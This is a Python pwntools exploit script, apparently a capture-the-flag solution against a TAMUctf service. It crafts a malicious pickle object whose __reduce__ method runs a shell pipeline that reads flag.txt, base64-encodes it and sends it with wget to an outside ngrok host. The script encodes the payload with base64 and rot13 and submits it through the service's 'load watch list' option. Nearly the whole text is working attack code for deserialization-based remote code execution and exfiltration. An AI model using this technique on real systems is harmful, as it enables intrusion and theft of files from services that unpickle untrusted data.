import zlib, os, subprocess, string
from pwn import *

my_base64chars  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
std_base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

class LsPwd(object):
    def __reduce__(self):
        return (subprocess.check_output, (('/bin/ls | '),))

class ReadPassword(object):
    def __reduce__(self):
        return (subprocess.Popen, ('/bin/cat flag.txt | base64 | xargs wget http://4f5b8e9e.ngrok.io --user-agent',0, None, None, None, None, None, None, True))

h = [0 for i in range(47)]
h[5] = ReadPassword()

rot13 = string.maketrans( 
    "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz", 
    "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")

def main():
    import pickle
    s = pickle.dumps(h)
    #s = zlib.compress(s)
    #s = s.translate(string.maketrans(my_base64chars, std_base64chars))
    s = s.encode('base64').replace("\n",'')
    return string.translate(s, rot13)

v = remote('pwn.tamuctf.com', 8448)
v.recvuntil('4. Load your watch list')
v.sendline('4')
v.recvuntil('Load your backed up list here: ')
payload = main()
log.info(payload)
v.sendline(payload)
log.info(v.recvuntil('1. Add an episode to your watched list'))
